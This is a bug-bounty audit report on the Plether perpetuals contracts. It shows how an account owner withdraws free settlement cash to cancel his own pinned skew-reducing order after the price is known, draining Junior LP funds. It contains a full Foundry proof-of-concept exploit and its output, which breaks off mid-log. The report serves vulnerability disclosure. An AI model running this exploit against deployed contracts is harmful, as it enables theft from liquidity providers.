# \#98905 [SC-Low] Withdrawing free settlement in MarginClearinghouse cancels the owner's own pinned skew-reducing open, leading to direct theft of LP funds

**Submitted on Nov 10th 2026 at 20:56:21 UTC by @deltabear for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98905
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A skew-reducing open earns a VPI rebate. The planner funds that rebate's reserve out of the account's free settlement cash and re-reads that cash at execution time, but the commit locks only margin and bounty, and `MarginClearinghouse.withdraw` never counts a pending open's free-cash dependency. So the owner commits a skew-reducing SHORT in the margin band where it fills only while free cash backs the reserve. After the order's pinned fill tick is public he keeps the cash when the market moved his way, so the order fills at the old price, or he withdraws the cash when it moved against him, so the order fails terminally for at most the 0.20 USDG open bounty, refunded if he runs the keeper call himself. It is a zero-premium option paid out of Junior LP principal. In the realistic plus or minus 30 bps run below, six rounds end with the attacker's own USDG wallet 962.858939 USDG richer after he withdraws everything, and the Junior LP's real 25% redemption pays out 330.856079 USDG less than with no attacker.

## Vulnerability Details

The value moves in this order.

1. A skew-reducing open earns a negative VPI, so the planner must hold a rebate reserve. It funds that reserve from free settlement first: `vpiReserveFromFreeAssets = min(reserveIncrease, resultingFreeSettlementAssets)`, and only the remainder comes from the pledge (`CfdEnginePlanLib.sol:564-567`). The post-open position margin is the open cost minus the pledge part of the reserve (`CfdEnginePlanLib.sol:578-579`). This runs at execution against the account's free cash at that moment.

2. The reserve is locked only at execution, in the settlement sidecar (`CfdEngineSettlementSidecar.sol:466-471`). The commit reserves margin plus the open bounty, never the free cash the plan leans on. Between commit and execution that cash sits unlocked.

3. `MarginClearinghouse.withdraw` gates on account ownership only (`MarginClearinghouse.sol:403-408`), and its balance checks are the settlement balance, the engine withdraw guard, and the locked-margin buckets (`MarginClearinghouse.sol:449-473`). A pending open's free-cash dependency is in none of those buckets, so the owner withdraws the cash while the order is queued.

4. At execution the reserve now has to come out of the pledge, the post-open margin drops below the initial-margin line, and the planner rejects the open. The sidecar marks it terminal `PlannerRejected` (`OrderRouterExecutionSidecar.sol:850-853`). The order is gone and the only cost is the open bounty, which returns to the owner when he calls `executeOrder` himself, a call open to any caller (`OrderRouter.sol:240-243`).

So the owner holds a zero-premium option: commit a skew-reducing open in the margin band where it is valid only while free cash backs the reserve, then after the pinned fill tick is public, keep the cash when the market moved his way or withdraw it to cancel when it moved against him. The guard that should have stopped this is a commit-time lock on the free cash the open's reserve will consume, so a queued open cannot be defunded by a withdraw. There is none.

### Vulnerable source code

**1. The rebate reserve is funded from free settlement first @ packages/perps/src/libraries/CfdEnginePlanLib.sol:564-567**
```solidity
        uint256 vpiReserveFromFreeAssets = vpiReserveIncreaseAssets < openCostPlan.resultingFreeSettlementAssets
            ? vpiReserveIncreaseAssets
            : openCostPlan.resultingFreeSettlementAssets;
        delta.vpiRebateReserveFromPledgeAssets = vpiReserveIncreaseAssets - vpiReserveFromFreeAssets;
```

**2. Post-open margin is the open cost minus the pledge part of the reserve @ packages/perps/src/libraries/CfdEnginePlanLib.sol:578-579**
```solidity
        delta.positionMarginAfterOpen =
            openCostPlan.resultingPositionMarginAssets - delta.vpiRebateReserveFromPledgeAssets - reserveIncreaseAssets;
```

**3. The reserve is locked only at execution, not at commit @ packages/perps/src/CfdEngineSettlementSidecar.sol:466-471**
```solidity
        if (delta.vpiRebateReserveAfterAssets > delta.vpiRebateReserveBeforeAssets) {
            uint256 reserveIncreaseAssets = delta.vpiRebateReserveAfterAssets - delta.vpiRebateReserveBeforeAssets;
            uint256 reserveFromFreeAssets = reserveIncreaseAssets - delta.vpiRebateReserveFromPledgeAssets;
            if (reserveFromFreeAssets > 0) {
                clearinghouse.lockVpiRebateReserve(delta.account, reserveFromFreeAssets);
            }
```

**4. Withdraw gates on account ownership only @ packages/perps/src/MarginClearinghouse.sol:403-408**
```solidity
    function withdraw(
        address account,
        uint256 amount
    ) external nonReentrant {
        _withdraw(account, msg.sender, amount);
    }
```

**5. Its checks are balance, the engine guard, and locked margin, none of them a pending open's free-cash dependency @ packages/perps/src/MarginClearinghouse.sol:461-473**
```solidity
        settlementBalances[account] -= amount;

        if (engine_ != address(0)) {
            IWithdrawGuard(engine_).checkWithdraw(account);
        }

        uint256 remainingEquity = getAccountEquityAssets(account);
        uint256 totalLockedMargin = _totalLockedMarginAssets(account);
        if (remainingEquity < totalLockedMargin) {
            revert MarginClearinghouse__InsufficientFreeEquity();
        }
        if (settlementBalances[account] < totalLockedMargin) {
            revert MarginClearinghouse__InsufficientAssetsForSettlement();
        }
```

**6. The defunded open fails terminally @ packages/perps/src/OrderRouterExecutionSidecar.sol:850-853**
```solidity
                classification.terminal = true;
                classification.plannerFailure = true;
                classification.plannerIsClose = isClose == 1;
                classification.reason = OrderV3Types.TerminalReason.PlannerRejected;
```

**7. Anyone executes the order, so the owner self-executes and the bounty returns to him @ packages/perps/src/OrderRouter.sol:240-243**
```solidity
    function executeOrder(
        uint64 orderId,
        bytes[] calldata pythUpdateData
    ) external payable nonReentrant returns (OrderV3Types.ExecutionResult memory result) {
```

## Impact Details

- Impact row: "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield" (Critical). At plus or minus 30 bps over six rounds, the attacker's own USDG wallet ends at 300,962.858939 USDG from 300,000.000000, +962.858939 USDG. The Junior LP's real 25% `claimRedeem` pays 249,700.632197 USDG against 250,031.488276 USDG in the no-attacker control, -330.856079 USDG, and the Junior's total value is 1,323.425638 USDG lower. The loss is Junior principal held in HousePool, not yield.
- The lever is what extracts the money. On the same six orders and the same price path, the passive attacker who never cancels nets -435.759611 USDG, so the free cancel is worth +1,398.618550 USDG to the attacker.
- A keeper cannot make the attacker lose. Every adverse round, three of three, is cancelled `PlannerRejected`, and the worst cancelled round costs the 0.20 USDG bounty, which is refunded when the owner self-executes (cost 0, LPs untouched).
- Prerequisites, all permissionless: trading margin in a clearinghouse account, a standing skew to reduce (the rebate requires skew reduction), and the public calls `commitOrder`, `withdraw`, `deposit` and `executeOrder` (any caller acts as keeper). No LP position, no privileged role.
- The incumbent LP never sees it. The free cash leaves between the pinned tick and the keeper's execution, inside one keeper-latency window, and the order simply disappears.
- It repeats every round that a skew is open.
- Dedup note. This is the same class as the confirmed Critical `lp-settlement-cancels-own-open` (an owner voids his own pinned open after the fill tick is public), whose root is the pre-audit finding SC-M4 component 3, marked fixed. The program's rule is "For findings marked as fixed or Acknowledged in the reports above, a report on the same root cause is valid only if it shows that the fix at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8 is incomplete or introduces a new bug." This is a distinct bug at that commit: the lever is `MarginClearinghouse.withdraw`, not `Router.settleLpEpoch`; the planner path is a collateral and margin shortfall (`OpenRevertCode` 5 `MARGIN_DRAINED_BY_FEES` or 6 `INSUFFICIENT_INITIAL_MARGIN`), not `SKEW_TOO_HIGH` (4); it needs no LP lot and a 150,000 USDG skew-reducing SHORT, not a 4,000,000 USDG near-cap LONG; and the fix is in a different contract. Locking the free cash at commit does not close `settleLpEpoch`, and the skew-cap fix does not close the withdraw. The PoC also meets the known-issue HIGH-1 bar, "a proof of concept showing a repeatable, net-profitable extraction from LPs".

## References

Reserve funding and margin
- packages/perps/src/libraries/CfdEnginePlanLib.sol:564-567 - rebate reserve funded from free settlement first
- packages/perps/src/libraries/CfdEnginePlanLib.sol:578-579 - post-open margin reduced by the pledge part of the reserve
- packages/perps/src/CfdEngineSettlementSidecar.sol:466-471 - reserve locked only at execution

Withdraw gate
- packages/perps/src/MarginClearinghouse.sol:403-408 - `withdraw`, caller is the account owner, no order check
- packages/perps/src/MarginClearinghouse.sol:449-473 - balance, engine guard and locked-margin checks only

Terminal cancel and self-execution
- packages/perps/src/OrderRouterExecutionSidecar.sol:850-853 - terminal `PlannerRejected`
- packages/perps/src/OrderRouter.sol:240-243 - `executeOrder`, any caller

## Link to Proof of Concept

https://gist.github.com/decies-centena-millia/09c36bcdd10308dd76c2e002ea78313b

## Proof of Concept

## Proof of Concept

One test file drives the direct-theft proof: three worlds replay the same recorded price path and time grid, A with no attacker, B with the attacker pulling the withdraw lever on every adverse round, C with the attacker passive on the same orders. Each world then runs a real `router.settleLpEpoch`, lets the Junior LP redeem 25% of its shares for real USDG, and has the attacker withdraw his whole clearinghouse balance to his wallet. Every impact number is read back from the system (`settlementToken.balanceOf`, `juniorVault.claimRedeem`, `pool.juniorPrincipal`), not computed by the test. It runs in the repo's own Foundry suite at `a82d4fef` on the repo's `FindingBase` fixture with the `DEPLOYMENT.md` release parameters (asserted in `setUp` via `_assertReleaseConfig()`); only USDG and Pyth are the repo's mocks.

Tools: `forge 1.8.5` (commit `51a52c59`), `solc 0.8.35`, `via_ir = true`, optimizer 200 (the repo's unmodified `packages/perps/foundry.toml`). Place the three files under `packages/perps/test/findings/PA-withdraw-cancels-rebate-open/` of the shared suite checkout, then from `packages/perps`:

```bash
forge test --match-path "test/findings/PA-withdraw-cancels-rebate-open/*" --threads 1 -vv
```

`--threads 1` is required because both test contracts drive `vm.snapshotState`/`vm.revertToState` and forge shares that state across parallel test contracts. Each file alone is deterministic (`PASelfCancel.t.sol` 6/6, `WithdrawLeverImpactPoC.t.sol` 3/3). This is a runner artifact, not a property of the exploit.

### attack step-by-step

1. The Junior LP holds 1,000,000 USDG, the Senior LP 500,000 USDG, and a third-party trader holds a long-heavy book that sets the skew the attacker reduces. The attacker funds a trading account with 300,000 USDG.
2. Each round the attacker commits a 150,000 USDG skew-reducing SHORT at 33 bps of margin, inside the 31 to 34 bps cancellable band. The pinned first tick at commit + 1 prints at the pre-jump price.
3. The market moves 30 bps after the pinned tick and before any keeper executes. On a favourable move the attacker keeps his free cash, executes his own order, and it fills at the old tick for a profit.
4. On an adverse move the attacker calls `clearinghouse.withdraw` for his free settlement, then runs `executeOrder` on his own order. The open fails `PlannerRejected` and refunds the bounty, so the adverse round costs 0. He re-deposits the cash for the next round.
5. After six rounds every position is closed, `router.settleLpEpoch` runs, the Junior LP redeems 25% of its shares for real USDG, and the attacker withdraws his whole clearinghouse balance to his wallet.

### main Attack code

The lever and the system read-back, from `WithdrawLeverImpactPoC.t.sol`:

```solidity
// one round: the pinned tick prints, the market moves, then the owner pulls the free cash on an adverse move
_advance(1, 0);                       // the pinned first tick (commit+1) prints at the pre-jump price
_advance(2, jump);                    // the market moves; no keeper has executed yet
if (mode == 1 && jump < 0) {
    pulled = _free(a);                // THE LEVER: pull the free settlement the plan depends on
    vm.prank(a);
    clearinghouse.withdraw(a, pulled);
}
_roll();
(uint64 head, uint256 ct,,) = _headInfo();
Outcome memory o = _attempt(head, ct, a); // the owner executes his own order; FAILED on the pulled rounds
```

```solidity
// end of each world: real system settlement, real redemption, real wallet, all read back from the system
vm.prank(honest);
router.settleLpEpoch(_live());
w.juniorPrincipal = pool.juniorPrincipal();
uint256 claimable = juniorVault.claimableRedeemRequest(requestId, address(this));
uint256 before_ = settlementToken.balanceOf(address(this));
juniorVault.claimRedeem(requestId, claimable, address(this), address(this));
w.juniorClaimedUsdg = settlementToken.balanceOf(address(this)) - before_;
uint256 bal = _bal(T[0]);
if (bal != 0) { vm.prank(T[0]); clearinghouse.withdraw(T[0], bal); }
w.attackerWallet = settlementToken.balanceOf(T[0]);
```

```
plant : commit a 150,000 USDG skew-reducing SHORT in the 31-34 bps cancellable band, let its pinned fill tick print
fire  : withdraw the free settlement on the adverse rounds (the open dies for 0.20, refunded on self-execution) and keep it on the favourable rounds (fills at the old tick); then settle, redeem, and withdraw to the attacker wallet
```

### full poc code, single file, single runnable command

The three files are in the gist. `PABase.sol` is the harness over the repo's `FindingBase`, `WithdrawLeverImpactPoC.t.sol` is the direct-theft proof, `PASelfCancel.t.sol` is the mechanism and economics (flip band, terminal planner code, plus or minus 30 bps economics, the free self-cancel, the opt-in floor control). All at `forge 1.8.5`, `solc 0.8.35`, via-IR.

PABase.sol (forge 1.8.5, solc 0.8.35)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.35;

import {FindingBase} from "../FindingBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @dev Shared machinery, ported onto the poc-suite's `FindingBase` so every result comes from the repo's own Foundry
///      suite at commit a82d4fef with the production release parameters in packages/perps/DEPLOYMENT.md (asserted in
///      setUp). Only USDG and Pyth are mocks. Every fill is a REAL pinned fill: an explicit FeedUpdate[] stamped at
///      commit+1 with prevPublishTime = commit, so the executor cannot choose the price.
abstract contract PABase is FindingBase {

    bytes32 internal constant FA = bytes32(uint256(1)); // == BASE_PYTH_FEED_A
    bytes32 internal constant FB = bytes32(uint256(2)); // == BASE_PYTH_FEED_B
    uint64 internal constant CONF = 1e4;

    uint8 internal constant C_REVERT = 0;
    uint8 internal constant C_PENDING = 1;
    uint8 internal constant C_EXECUTED = 2;
    uint8 internal constant C_FAILED = 3;
    uint8 internal constant C_NOHEAD = 4;

    struct Outcome {
        uint8 cls;
        uint8 pend;
        uint8 term;
        bytes4 sel;
        bytes rev;
    }

    address internal keeperAddr = address(0xA44);
    address internal honest = address(0xB44);
    address internal stranger = address(0x5157);
    address[4] internal T;

    uint256 internal price = 1e8;
    uint256[] internal pathT;
    uint256[] internal pathP;

    uint256 internal constant JUNIOR_DEPOSIT = 1_000_000e6;
    uint256 internal constant SENIOR_DEPOSIT = 500_000e6;

    function _initialJuniorDeposit() internal pure virtual override returns (uint256) {
        return JUNIOR_DEPOSIT;
    }

    function _initialSeniorDeposit() internal pure virtual override returns (uint256) {
        return SENIOR_DEPOSIT;
    }

    function setUp() public virtual override {
        super.setUp();
        _assertReleaseConfig(); // fail loudly if the fixture ever drifts from DEPLOYMENT.md
        pathT.push(0);
        pathP.push(1e8);
        T[0] = address(0xA11);
        T[1] = address(0xA22);
        T[2] = address(0xA55);
        T[3] = address(0xA66);
        for (uint256 i; i < 4; ++i) {
            _fund(T[i], 300_000e6);
        }
        uint256 next = (vm.getBlockTimestamp() / 1 hours + 1) * 1 hours + 1;
        vm.warp(next);
        _roll();
        _setPrice(price);
        vm.prank(honest);
        router.updateMarkPrice(_live());
    }

    function _R() internal view returns (OrderRouter) {
        return OrderRouter(payable(address(router)));
    }

    function _roll() internal {
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _fund(address who, uint256 amount) internal {
        settlementToken.mint(who, amount);
        vm.startPrank(who);
        settlementToken.approve(address(clearinghouse), type(uint256).max);
        clearinghouse.deposit(who, amount);
        vm.stopPrank();
    }

    function _free(address who) internal view returns (uint256) {
        return clearinghouse.getAccountAssetBuckets(who).freeSettlementAssets;
    }

    function _bal(address who) internal view returns (uint256) {
        return clearinghouse.balanceAssets(who);
    }

    function _pos(address who) internal view returns (uint256 size, uint256 margin, CfdTypes.Side side) {
        (size, margin,,, side,,) = engine.positions(who);
    }

    function _priceAt(uint256 t) internal view returns (uint256) {
        uint256 lo;
        uint256 hi = pathT.length - 1;
        while (lo < hi) {
            uint256 mid = (lo + hi + 1) / 2;
            if (pathT[mid] <= t) lo = mid;
            else hi = mid - 1;
        }
        return pathP[lo];
    }

    function _setPrice(uint256 p) internal {
        price = p;
        pathT.push(vm.getBlockTimestamp());
        pathP.push(p);
    }

    /// @dev Advance `dt` seconds and re-price by `dBps` basis points (applies to ticks at or after the new time).
    function _advance(uint256 dt, int256 dBps) internal {
        vm.warp(vm.getBlockTimestamp() + dt);
        _roll();
        int256 np = int256(price) + int256(price) * dBps / 10_000;
        _setPrice(uint256(np));
    }

    function _tick(uint256 t, uint256 p) internal pure returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory u = new MockPyth.FeedUpdate[](2);
        u[0] = MockPyth.FeedUpdate({id: FA, price: MockPyth.MockPrice(int64(uint64(p)), CONF, int32(-8), t, t - 1)});
        u[1] = MockPyth.FeedUpdate({id: FB, price: MockPyth.MockPrice(int64(uint64(p)), CONF, int32(-8), t, t - 1)});
        data = new bytes[](1);
        data[0] = abi.encode(u);
    }

    function _live() internal view returns (bytes[] memory) {
        return _tick(vm.getBlockTimestamp(), price);
    }

    function _refresh() internal {
        _roll();
        vm.prank(honest);
        try router.updateMarkPrice(_live()) {} catch {}
    }

    function _headInfo() internal view returns (uint64 head, uint256 commitTime, uint256 deadline, address account) {
        head = router.nextExecuteId();
        if (head == 0) return (0, 0, 0, address(0));
        (IOrderRouterAccounting.PendingOrderView memory v,) = router.getPendingOrderView(head);
        commitTime = uint256(v.commitTime);
        if (commitTime == 0) return (0, 0, 0, address(0));
        OrderV3Types.PendingIntent memory pi = router.lifecycleBook().pendingIntent(head);
        deadline = pi.timing.executionDeadline;
        account = pi.account;
    }

    /// @dev The pinned first tick after the order's commit second, priced from the recorded path.
    function _pinned(uint256 commitTime) internal view returns (bytes[] memory) {
        return _tick(commitTime + 1, _priceAt(commitTime + 1));
    }

    /// @dev One real honest-keeper attempt on `head` (mutates state). Call inside a snapshot to probe.
    function _attempt(uint64 head, uint256 commitTime, address executor) internal returns (Outcome memory o) {
        _roll();
        bytes[] memory d = _pinned(commitTime);
        vm.prank(executor);
        try _R().executeOrder(head, d) returns (OrderV3Types.ExecutionResult memory r) {
            o.term = uint8(r.terminalReason);
            o.pend = uint8(r.pendingReason);
            if (r.status == OrderV3Types.LifecycleStatus.Executed) o.cls = C_EXECUTED;
            else if (r.status == OrderV3Types.LifecycleStatus.Failed) o.cls = C_FAILED;
            else o.cls = C_PENDING;
        } catch (bytes memory reason) {
            o.cls = C_REVERT;
            o.rev = reason;
            if (reason.length >= 4) {
                bytes4 s;
                assembly ("memory-safe") { s := mload(add(reason, 32)) }
                o.sel = s;
            }
        }
    }

    /// @dev Simulates an honest keeper executing the current global head, then reverts all state.
    function _probe() internal returns (Outcome memory o) {
        (uint64 head, uint256 ct,,) = _headInfo();
        if (head == 0 || vm.getBlockTimestamp() < ct + 1) {
            o.cls = C_NOHEAD;
            return o;
        }
        uint256 snap = vm.snapshotState();
        o = _attempt(head, ct, honest);
        vm.revertToState(snap);
    }

    function _describe(Outcome memory o) internal pure returns (string memory) {
        string[5] memory names = ["REVERT", "PENDING", "EXECUTED", "FAILED", "NOHEAD"];
        return string.concat(names[o.cls], " pend=", _u(o.pend), " term=", _u(o.term), " sel=", _hex4(o.sel));
    }

    function _u(uint256 v) internal pure returns (string memory) {
        return vm.toString(v);
    }

    function _hex4(bytes4 b) internal pure returns (string memory) {
        return vm.toString(abi.encodePacked(b));
    }

    function _req(CfdTypes.Side side, uint256 lots, uint256 margin, bool isClose)
        internal
        view
        returns (OrderV3Types.OrderRequest memory q)
    {
        q.clientOrderId = keccak256(abi.encode("pa-cid", router.nextCommitId(), side, lots, margin, isClose));
        q.side = side;
        q.sizeDelta = lots * CfdTypes.SIZE_QUANTUM;
        q.marginDelta = margin;
        q.targetPrice = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        q.isClose = isClose;
        q.bounds.submitBy = uint64(vm.getBlockTimestamp()) + 60;
        q.bounds.executionWindowSeconds = uint32(router.maxExecutionWindowSeconds());
        q.bounds.allowedExecutionModes = 7;
        q.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        q.bounds.maxExecutionBountyAssets = type(uint256).max;
        q.bounds.maxExecutionNotionalAssets = type(uint256).max;
        q.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        q.bounds.maxActionChargeAssets = type(uint256).max;
        q.bounds.maxExplicitFeesAssets = type(uint256).max;
        q.bounds.maxPostPositionSize = type(uint256).max;
        q.bounds.maxPostLeverageBps = type(uint32).max;
    }

    function _commit(address who, OrderV3Types.OrderRequest memory q)
        internal
        returns (bool ok, uint64 id, bytes memory err)
    {
        _roll();
        vm.prank(who);
        try _R().commitOrder(q) returns (uint64 oid) {
            return (true, oid, "");
        } catch (bytes memory e) {
            return (false, 0, e);
        }
    }

    /// @dev Honest keeper loop: execute heads until the queue is empty, stalls, or `maxSteps` is reached.
    function _drain(uint256 maxSteps) internal {
        for (uint256 i; i < maxSteps; ++i) {
            (uint64 head, uint256 ct,,) = _headInfo();
            if (head == 0) return;
            if (vm.getBlockTimestamp() < ct + 1) {
                vm.warp(ct + 1);
                _setPrice(price);
            }
            _attempt(head, ct, honest);
            if (router.nextExecuteId() == head) return;
        }
    }
}
```

WithdrawLeverImpactPoC.t.sol (forge 1.8.5, solc 0.8.35)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.35;

import {PABase} from "./PABase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {console2} from "forge-std/console2.sol";

/// @title Impact PoC: an owner cancels his own pinned rebate-earning open by withdrawing free settlement.
/// @dev Impact row (SCOPE.md #1, Critical): "Direct theft of any user funds, whether at-rest or in-motion, other
///      than unclaimed yield". The victims are the Junior/Senior LPs whose USDG sits in HousePool. Three worlds
///      replay the SAME recorded price path and time grid: A control (no attacker), B attacker WITH the lever, C
///      attacker passive. Each world closes all positions, runs a real settleLpEpoch, lets the Junior LP redeem 25%
///      of its shares for REAL USDG, and the attacker withdraws its whole clearinghouse balance to its wallet. Every
///      number is read back FROM THE SYSTEM (settlementToken.balanceOf, claimRedeem, pool.juniorPrincipal).
contract WithdrawLeverImpactPoC is PABase {

    uint256 internal constant ATTACKER_START = 300_000e6;
    uint256 internal constant LOTS = 1500;            // $150k notional at price 1.0
    uint256 internal constant BAND_MARGIN_BPS = 33;   // inside the 31-34 bp band at release parameters

    struct World {
        uint256 attackerWallet;
        uint256 juniorPrincipal;
        uint256 seniorPrincipal;
        uint256 poolAssets;
        uint256 juniorClaimedUsdg;
        uint256 juniorValue;
        uint256 voided;
        uint256 executed;
    }

    function _skewBook() internal {
        (bool ok,,) = _commit(T[1], _req(CfdTypes.Side.LONG, 3000, 3000 * price * 300 / 10_000, false));
        require(ok, "skew commit");
        _advance(2, 0);
        _drain(2);
    }

    /// @dev One attack round. `jump` is the move (bps) that lands AFTER the pinned tick and BEFORE any keeper
    ///      executed. `mode`: 0 control, 1 lever, 2 passive.
    function _round(uint8 mode, int256 jump, World memory w) internal {
        address a = T[0];
        if (mode != 0) {
            (bool ok,,) = _commit(a, _req(CfdTypes.Side.SHORT, LOTS, LOTS * price * BAND_MARGIN_BPS / 10_000, false));
            require(ok, "attacker commit");
        }
        _advance(1, 0);    // the pinned first tick (commit+1) prints here, at the pre-jump price
        _advance(2, jump); // the market moves; no keeper has executed yet
        uint256 pulled;
        if (mode == 1 && jump < 0) {
            // THE LEVER: the SHORT loses on a falling price, so pull the free settlement the plan depends on.
            pulled = _free(a);
            vm.prank(a);
            clearinghouse.withdraw(a, pulled);
        }
        if (mode != 0) {
            _roll();
            (uint64 head, uint256 ct,,) = _headInfo();
            Outcome memory o = _attempt(head, ct, a); // the attacker executes his own order (bounty returns to him)
            if (o.cls == C_FAILED) ++w.voided;
            else if (o.cls == C_EXECUTED) ++w.executed;
            if (pulled != 0) {
                vm.startPrank(a);
                settlementToken.approve(address(clearinghouse), type(uint256).max);
                clearinghouse.deposit(a, pulled); // put the cash back for the next round
                vm.stopPrank();
            }
            (uint256 size,,) = _pos(a);
            if (size != 0) {
                (bool cok,,) = _commit(a, _req(CfdTypes.Side.SHORT, size / CfdTypes.SIZE_QUANTUM, 0, true));
                require(cok, "close commit");
                _advance(2, 0);
                _drain(3);
            }
        }
    }

    function _world(uint8 mode, uint256 jumpBps, uint256 rounds) internal returns (World memory w) {
        uint256 snap = vm.snapshotState();
        uint256 t0 = _now();
        _skewBook();
        for (uint256 i; i < rounds; ++i) {
            // favourable round first (SHORT profits when the price rises), then adverse; the path returns to ~1.0
            int256 j = (i % 2 == 0) ? int256(jumpBps) : -int256(jumpBps);
            _round(mode, j, w);
        }

        // Normalise: every world closes the third-party skew book at the same instant and price.
        vm.warp(t0 + 600);
        _roll();
        _setPrice(1e8);
        (uint256 sz,,) = _pos(T[1]);
        if (sz != 0) {
            (bool ok,,) = _commit(T[1], _req(CfdTypes.Side.LONG, sz / CfdTypes.SIZE_QUANTUM, 0, true));
            require(ok, "skew close commit");
            _advance(2, 0);
            _drain(3);
        }

        // LP side: the Junior LP redeems 25% of its shares for real USDG; the settlement that funds it reconciles
        // the pool (booking every world's trading result into the tranche principals).
        vm.warp(t0 + 1200);
        _roll();
        _setPrice(1e8);
        uint256 shares = juniorVault.maxRequestRedeem(address(this)) / 4;
        uint256 requestId = juniorVault.requestRedeem(shares, address(this), address(this));
        vm.warp(((_now() / 1 hours) + 1) * 1 hours + 1);
        _roll();
        _setPrice(1e8);
        vm.prank(honest);
        router.settleLpEpoch(_live());
        w.juniorPrincipal = pool.juniorPrincipal();
        w.seniorPrincipal = pool.seniorPrincipal();
        w.poolAssets = pool.totalAssets();
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, address(this));
        uint256 before_ = settlementToken.balanceOf(address(this));
        juniorVault.claimRedeem(requestId, claimable, address(this), address(this));
        w.juniorClaimedUsdg = settlementToken.balanceOf(address(this)) - before_;

        // Attacker withdraws everything it has in the clearinghouse to its wallet.
        uint256 bal = _bal(T[0]);
        if (bal != 0) {
            vm.prank(T[0]);
            clearinghouse.withdraw(T[0], bal);
        }
        w.juniorValue = w.juniorPrincipal + w.juniorClaimedUsdg;
        w.attackerWallet = settlementToken.balanceOf(T[0]);
        vm.revertToState(snap);
    }

    function _print(string memory label, World memory w) internal pure {
        console2.log(label);
        console2.log("  attacker wallet (USDG atoms)      ", w.attackerWallet);
        console2.log("  Junior principal (USDG atoms)     ", w.juniorPrincipal);
        console2.log("  Senior principal (USDG atoms)     ", w.seniorPrincipal);
        console2.log("  pool totalAssets (USDG atoms)     ", w.poolAssets);
        console2.log("  Junior LP redeems 25% -> USDG     ", w.juniorClaimedUsdg);
        console2.log("  Junior value (principal + redeemed)", w.juniorValue);
        console2.log("  rounds voided / executed          ", w.voided, w.executed);
    }

    /// @notice The impact PoC at a REALISTIC +-30 bp jump (the largest single Pyth update on record is 32.5 bp).
    function test_impact_directTheftFromLps_30bp() public {
        _impact(30, 6);
    }

    /// @notice Same at +-100 bp (a stylised news jump; NOT the headline).
    function test_impact_directTheftFromLps_100bp() public {
        _impact(100, 6);
    }

    function _impact(uint256 jumpBps, uint256 rounds) internal {
        World memory a = _world(0, jumpBps, rounds);
        World memory b = _world(1, jumpBps, rounds);
        World memory c = _world(2, jumpBps, rounds);
        console2.log("=== jump bps / rounds", jumpBps, rounds);
        _print("A control (no attacker)", a);
        _print("B attacker WITH the lever", b);
        _print("C attacker passive (same orders, no lever)", c);

        int256 attackerGainB = int256(b.attackerWallet) - int256(ATTACKER_START);
        int256 attackerGainC = int256(c.attackerWallet) - int256(ATTACKER_START);
        int256 juniorLossB = int256(a.juniorValue) - int256(b.juniorValue);
        int256 lpRedeemLossB = int256(a.juniorClaimedUsdg) - int256(b.juniorClaimedUsdg);
        console2.log("attacker net USDG, with lever (signed atoms)");
        console2.logInt(attackerGainB);
        console2.log("attacker net USDG, passive (signed atoms)");
        console2.logInt(attackerGainC);
        console2.log("Junior LPs lose vs control (total Junior value, signed atoms)");
        console2.logInt(juniorLossB);
        console2.log("Junior LP's real 25% redemption is lower by (signed atoms)");
        console2.logInt(lpRedeemLossB);

        assertEq(b.voided, rounds / 2, "each adverse round is cancelled by the withdraw");
        assertEq(b.executed, rounds / 2, "each favourable round executes at the old tick");
        assertEq(c.voided, 0, "passive owner cannot cancel");
        assertGt(attackerGainB, 0, "attacker withdraws a profit to its wallet");
        assertLt(attackerGainC, attackerGainB, "lever strictly dominates passive trading");
        assertGt(juniorLossB, 0, "Junior value is lower than in the no-attacker control");
        assertGe(juniorLossB, attackerGainB, "LP loss covers the attacker's gain");
        assertGt(lpRedeemLossB, 0, "the Junior LP's real redemption pays out less USDG than in the control");
    }

    /// @notice Break-even size: one favourable round only (lever unused), attacker net as a function of the jump.
    function test_breakeven_table() public {
        uint256[7] memory js = [uint256(2), 5, 8, 9, 12, 30, 100];
        for (uint256 i; i < js.length; ++i) {
            World memory b = _world(1, js[i], 1);
            int256 g = int256(b.attackerWallet) - int256(ATTACKER_START);
            console2.log("jump bps", js[i]);
            console2.log("  attacker net on the favourable round (signed atoms)");
            console2.logInt(g);
        }
    }
}
```

`PASelfCancel.t.sol` (the flip-band, terminal-code, economics, self-cancel and floor-control tests) is in the gist at https://gist.github.com/decies-centena-millia/09c36bcdd10308dd76c2e002ea78313b#file-paselfcancel-t-sol .

### Output

Raw `-vv` output of the 30 bps impact test, verbatim (full logs in the gist). The attacker gain, the Junior loss and the lower Junior redemption are read straight from the system:

```
[PASS] test_impact_directTheftFromLps_30bp() (gas: 85840048)
Logs:
  === jump bps / rounds 30 6
  A control (no attacker)
    attacker wallet (USDG atoms)       300000000000
    Junior principal (USDG atoms)      750095464945
    Senior principal (USDG atoms)      500010133724
    pool totalAssets (USDG atoms)      1250105598669
    Junior LP redeems 25% -> USDG      250031488276
    Junior value (principal + redeemed) 1000126953221
    rounds voided / executed           0 0
  B attacker WITH the lever
    attacker wallet (USDG atoms)       300962858939
    Junior principal (USDG atoms)      749102895386
    Senior principal (USDG atoms)      500010133724
    pool totalAssets (USDG atoms)      1249113029110
    Junior LP redeems 25% -> USDG      249700632197
    Junior value (principal + redeemed) 998803527583
    rounds voided / executed           3 3
  C attacker passive (same orders, no lever)
    attacker wallet (USDG atoms)       299564240389
